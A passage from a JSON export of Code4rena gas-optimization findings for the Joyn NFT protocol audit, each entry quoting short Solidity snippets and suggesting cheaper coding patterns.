      "content": "\n1.  File: splits/contracts/Splitter.sol (lines [217-220](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L217-L220))\n\n```solidity\n    function amountFromPercent(uint256 amount, uint32 percent)\n        private\n        pure\n        returns (uint256)\n```\n\n2.  File: splits/contracts/Splitter.sol (lines [248-250](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L248-L250))\n\n```solidity\n    function attemptETHTransfer(address to, uint256 value)\n        private\n        returns (bool)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-18-private-functions-not-called-by-the-contract-should-be-removed-to-save-deployment-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5285",
      "title": "[G-17] `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "\n1.  File: splits/contracts/Splitter.sol (line [164](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L164))\n\n```solidity\n        require(royaltyAmount > 0, \"No additional funds for window\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-17-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "5284",
      "title": "[G-13] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code\n\n1.  File: splits/contracts/Splitter.sol (line [14](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L14))\n\n```solidity\n    uint256 public constant PERCENTAGE_SCALE = 10e5;\n```\n\n2.  File: splits/contracts/Splitter.sol (line [15](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L15))\n\n```solidity\n    bytes4 public constant IID_IROYALTY = type(IRoyaltyVault).interfaceId;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-13-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5283",
      "title": "[G-11] `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/CoreCollection.sol (line [279](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L279))\n\n```solidity\n        for (uint256 i = 0; i < _amount; i++) {\n```\n\n2.  File: core-contracts/contracts/CoreFactory.sol (line [79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L79))\n\n```solidity\n    for (uint256 i; i < _collections.length; i++) {\n```\n\n3.  File: splits/contracts/Splitter.sol (line [50](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L50))\n\n```solidity\n        for (uint256 i = 0; i < currentWindow; i++) {\n```\n\n4.  File: splits/contracts/Splitter.sol (line [274](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L274))\n\n```solidity\n        for (uint256 i = 0; i < proof.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-11-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too",
      "tags": [],
      "finders": []
    },
    {
      "id": "5282",
      "title": "[G-10] `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/CoreCollection.sol (line [279](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L279))\n\n```solidity\n        for (uint256 i = 0; i < _amount; i++) {\n```\n\n2.  File: core-contracts/contracts/CoreFactory.sol (line [79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L79))\n\n```solidity\n    for (uint256 i; i < _collections.length; i++) {\n```\n\n3.  File: splits/contracts/Splitter.sol (line [50](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L50))\n\n```solidity\n        for (uint256 i = 0; i < currentWindow; i++) {\n```\n\n4.  File: splits/contracts/Splitter.sol (line [274](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L274))\n\n```solidity\n        for (uint256 i = 0; i < proof.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-10-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "5281",
      "title": "[G-09] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/CoreCollection.sol (line [79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L79))\n\n```solidity\n        string memory _collectionName,\n```\n\n2.  File: core-contracts/contracts/CoreCollection.sol (line [80](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L80))\n\n```solidity\n        string memory _collectionSymbol,\n```\n\n3.  File: core-contracts/contracts/CoreCollection.sol (line [81](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L81))\n\n```solidity\n        string memory _collectionURI,\n```\n\n4.  File: core-contracts/contracts/CoreCollection.sol (line [122](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L122))\n\n```solidity\n        string memory _collectionName,\n```\n\n5.  File: core-contracts/contracts/CoreCollection.sol (line [123](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L123))\n\n```solidity\n        string memory _collectionSymbol\n```\n\n6.  File: core-contracts/contracts/CoreFactory.sol (line [71](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L71))\n\n```solidity\n    string memory _projectId,\n```\n\n7.  File: core-contracts/contracts/CoreFactory.sol (line [72](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L72))\n\n```solidity\n    Collection[] memory _collections\n```\n\n8.  File: core-contracts/contracts/CoreFactory.sol (line [109](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L109))\n\n```solidity\n    string memory _projectId,\n```\n\n9.  File: core-contracts/contracts/CoreFactory.sol (line [110](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L110))\n\n```solidity\n    Collection memory _collection\n```\n\n10. File: core-contracts/contracts/CoreFactory.sol (line [128](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L128))\n\n```solidity\n  function getProject(string memory _projectId)\n```\n\n11. File: splits/contracts/SplitFactory.sol (line [79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L79))\n\n```solidity\n    string memory _splitId\n```\n\n12. File: splits/contracts/SplitFactory.sol (line [105](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L105))\n\n```solidity\n    string memory _splitId\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-09-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5280",
      "title": "[G-06] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n\n1.  File: core-contracts/contracts/CoreFactory.sol (line [79](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L79))\n\n```solidity\n    for (uint256 i; i < _collections.length; i++) {\n```\n\n2.  File: splits/contracts/Splitter.sol (line [274](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L274))\n\n```solidity\n        for (uint256 i = 0; i < proof.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-06-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "5279",
      "title": "[G-05] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/CoreCollection.sol (lines [52-55](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L52-L55))\n\n```solidity\n        require(\n            _maxSupply > 0,\n            \"CoreCollection: Max supply should be greater than 0\"\n        );\n```\n\n2.  File: core-contracts/contracts/CoreCollection.sol (line [146](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L146))\n\n```solidity\n        require(amount > 0, \"CoreCollection: Amount should be greater than 0\");\n```\n\n3.  File: royalty-vault/contracts/RoyaltyVault.sol (lines [34-37](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L34-L37))\n\n```solidity\n        require(\n            balanceOfVault > 0,\n            \"Vault does not have enough royalty Asset to send\"\n        );\n```\n\n4.  File: splits/contracts/Splitter.sol (line [164](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L164))\n\n```solidity\n        require(royaltyAmount > 0, \"No additional funds for window\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-05-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5278",
      "title": "[G-04] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27>\n\n1.  File: core-contracts/contracts/ERC721Payable.sol (line [8](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L8))\n\n```solidity\n  bool public isForSale;\n```\n\n2.  File: core-contracts/contracts/CoreCollection.sol (line [20](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L20))\n\n```solidity\n    bool public initialized;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-04-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5277",
      "title": "[G-03] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.2 to get compiler automatic inlining\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1.  File: core-contracts/contracts/ERC721Payable.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L2))\n\n```solidity\npragma solidity ^0.8.0;\n```\n\n2.  File: core-contracts/contracts/CoreProxy.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreProxy.sol#L2))\n\n```solidity\npragma solidity ^0.8.0;\n```\n\n3.  File: core-contracts/contracts/ERC721Claimable.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Claimable.sol#L2))\n\n```solidity\npragma solidity ^0.8.0;\n```\n\n4.  File: core-contracts/contracts/CoreCollection.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L2))\n\n```solidity\npragma solidity ^0.8.0;\n```\n\n5.  File: core-contracts/contracts/CoreFactory.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L2))\n\n```solidity\npragma solidity ^0.8.0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-03-use-a-more-recent-version-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "5276",
      "title": "[G-02] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n1.  File: royalty-vault/contracts/RoyaltyVault.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L2))\n\n```solidity\npragma solidity ^0.8.4;\n```\n\n2.  File: royalty-vault/contracts/ProxyVault.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/ProxyVault.sol#L2))\n\n```solidity\npragma solidity ^0.8.4;\n```\n\n3.  File: splits/contracts/SplitFactory.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L2))\n\n```solidity\npragma solidity ^0.8.4;\n```\n\n4.  File: splits/contracts/SplitProxy.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitProxy.sol#L2))\n\n```solidity\npragma solidity ^0.8.4;\n```\n\n5.  File: splits/contracts/Splitter.sol (line [2](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L2))\n\n```solidity\npragma solidity ^0.8.4;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-02-use-a-more-recent-version-of-solidity",
      "tags": [],
      "finders": []
    },
    {
      "id": "5275",
      "title": "[G-01] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\n1.  File: core-contracts/contracts/ERC721Payable.sol (lines [21-24](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L21-L24))\n\n```solidity\n    require(\n      !royaltyVaultInitialized(),\n      'CoreCollection: Royalty Vault already initialized'\n    );\n```\n\n2.  File: core-contracts/contracts/ERC721Payable.sol (lines [29-32](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Payable.sol#L29-L32))\n\n```solidity\n    require(\n      royaltyVaultInitialized(),\n      'CoreCollection: Royalty Vault not initialized'\n    );\n```\n\n3.  File: core-contracts/contracts/ERC721Claimable.sol (line [23](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/ERC721Claimable.sol#L23))\n\n```solidity\n    require(!claimableSet(), 'ERC721Claimable: Claimable is already set');\n```\n\n4.  File: core-contracts/contracts/CoreCollection.sol (line [47](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L47))\n\n```solidity\n        require(!initialized, \"CoreCollection: Already initialized\");\n```\n\n5.  File: core-contracts/contracts/CoreCollection.sol (lines [52-55](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L52-L55))\n\n```solidity\n        require(\n            _maxSupply > 0,\n            \"CoreCollection: Max supply should be greater than 0\"\n        );\n```\n\n6.  File: core-contracts/contracts/CoreCollection.sol (line [146](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L146))\n\n```solidity\n        require(amount > 0, \"CoreCollection: Amount should be greater than 0\");\n```\n\n7.  File: core-contracts/contracts/CoreCollection.sol (lines [189-192](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L189-L192))\n\n```solidity\n        require(\n            msg.sender == splitFactory || msg.sender == owner(),\n            \"CoreCollection: Only Split Factory or owner can initialize vault.\"\n        );\n```\n\n8.  File: core-contracts/contracts/CoreCollection.sol (lines [204-207](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L204-L207))\n\n```solidity\n        require(\n            bytes(HASHED_PROOF).length == 0,\n            \"CoreCollection: Hashed Proof is set\"\n        );\n```\n\n9.  File: core-contracts/contracts/CoreCollection.sol (lines [220-223](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L220-L223))\n\n```solidity\n        require(\n            startingIndex == 0,\n            \"CoreCollection: Starting index is already set\"\n        );\n```\n\n10. File: core-contracts/contracts/CoreFactory.sol (lines [35-38](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L35-L38))\n\n```solidity\n    require(\n      projects[_projectId].creator == address(0),\n      'CoreFactory: Unavailable project id'\n    );\n```\n\n11. File: core-contracts/contracts/CoreFactory.sol (lines [43-46](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L43-L46))\n\n```solidity\n    require(\n      projects[_projectId].creator == msg.sender,\n      'CoreFactory: Not an owner of the project'\n    );\n```\n\n12. File: core-contracts/contracts/CoreFactory.sol (lines [51-54](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L51-L54))\n\n```solidity\n    require(\n      collections[_collectionId] == address(0),\n      'CoreFactory: Unavailable collection id'\n    );\n```\n\n13. File: core-contracts/contracts/CoreFactory.sol (lines [74-77](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L74-L77))\n\n```solidity\n    require(\n      _collections.length > 0,\n      'CoreFactory: should have more at least one collection'\n    );\n```\n\n14. File: royalty-vault/contracts/RoyaltyVault.sol (lines [34-37](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L34-L37))\n\n```solidity\n        require(\n            balanceOfVault > 0,\n            \"Vault does not have enough royalty Asset to send\"\n        );\n```\n\n15. File: royalty-vault/contracts/RoyaltyVault.sol (lines [43-46](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L43-L46))\n\n```solidity\n        require(\n            IERC20(royaltyAsset).transfer(splitterProxy, splitterShare) == true,\n            \"Failed to transfer royalty Asset to splitter\"\n        );\n```\n\n16. File: royalty-vault/contracts/RoyaltyVault.sol (lines [47-50](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L47-L50))\n\n```solidity\n        require(\n            ISplitter(splitterProxy).incrementWindow(splitterShare) == true,\n            \"Failed to increment splitter window\"\n        );\n```\n\n17. File: royalty-vault/contracts/RoyaltyVault.sol (lines [51-57](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L51-L57))\n\n```solidity\n        require(\n            IERC20(royaltyAsset).transfer(\n                platformFeeRecipient,\n                platformShare\n            ) == true,\n            \"Failed to transfer royalty Asset to platform fee recipient\"\n        );\n```\n\n18. File: splits/contracts/SplitFactory.sol (lines [48-51](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L48-L51))\n\n```solidity\n    require(\n      splits[_splitId] == address(0),\n      'SplitFactory : Split ID already in use'\n    );\n```\n\n19. File: splits/contracts/SplitFactory.sol (lines [81-84](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/SplitFactory.sol#L81-L84))\n\n```solidity\n    require(\n      ICoreCollection(_collectionContract).owner() == msg.sender,\n      'Transaction sender is not collection owner'\n    );\n```\n\n20. File: splits/contracts/Splitter.sol (lines [118-121](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L118-L121))\n\n```solidity\n        require(\n            !isClaimed(msg.sender, window),\n            \"NFT has already claimed the given window\"\n        );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-01-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4324",
      "title": "[G-21] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n1.  File: core-contracts/contracts/CoreCollection.sol (lines [78-87](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L78-L87))\n\n```solidity\n    function initialize(\n        string memory _collectionName,\n        string memory _collectionSymbol,\n        string memory _collectionURI,\n        uint256 _maxSupply,\n        uint256 _mintFee,\n        address _payableToken,\n        bool _isForSale,\n        address _splitFactory\n    ) external onlyOwner onlyValidSupply(_maxSupply) {\n```\n\n2.  File: core-contracts/contracts/CoreCollection.sol (lines [78-87](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L78-L87))\n\n```solidity\n    function initialize(\n        string memory _collectionName,\n        string memory _collectionSymbol,\n        string memory _collectionURI,\n        uint256 _maxSupply,\n        uint256 _mintFee,\n        address _payableToken,\n        bool _isForSale,\n        address _splitFactory\n    ) external onlyOwner onlyValidSupply(_maxSupply) {\n```\n\n3.  File: core-contracts/contracts/CoreCollection.sol (lines [105-109](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L105-L109))\n\n```solidity\n    function initializeClaims(bytes32 _root)\n        external\n        onlyOwner\n        onlyNotClaimableSet\n        onlyValidRoot(_root)\n```\n\n4.  File: core-contracts/contracts/CoreCollection.sol (lines [105-109](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L105-L109))\n\n```solidity\n    function initializeClaims(bytes32 _root)\n        external\n        onlyOwner\n        onlyNotClaimableSet\n        onlyValidRoot(_root)\n```\n\n5.  File: core-contracts/contracts/CoreCollection.sol (lines [105-109](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L105-L109))\n\n```solidity\n    function initializeClaims(bytes32 _root)\n        external\n        onlyOwner\n        onlyNotClaimableSet\n        onlyValidRoot(_root)\n```\n\n6.  File: core-contracts/contracts/CoreCollection.sol (lines [121-124](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L121-L124))\n\n```solidity\n    function setCollectionMeta(\n        string memory _collectionName,\n        string memory _collectionSymbol\n    ) external onlyOwner {\n```\n\n7.  File: core-contracts/contracts/CoreCollection.sol (lines [139-145](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L139-L145))\n\n```solidity\n    function mintToken(\n        address to,\n        bool isClaim,\n        uint256 claimableAmount,\n        uint256 amount,\n        bytes32[] calldata merkleProof\n    ) external onlyInitialized {\n```\n\n8.  File: core-contracts/contracts/CoreCollection.sol (line [173](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L173))\n\n```solidity\n    function withdraw() external onlyOwner {\n```\n\n9.  File: core-contracts/contracts/CoreCollection.sol (lines [185-187](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L185-L187))\n\n```solidity\n    function setRoyaltyVault(address _royaltyVault)\n        external\n        onlyVaultUninitialized\n```\n\n10. File: core-contracts/contracts/CoreCollection.sol (line [203](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L203))\n\n```solidity\n    function setHashedProof(string calldata _proof) external onlyOwner {\n```\n\n11. File: core-contracts/contracts/CoreFactory.sol (lines [70-73](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L70-L73))\n\n```solidity\n  function createProject(\n    string memory _projectId,\n    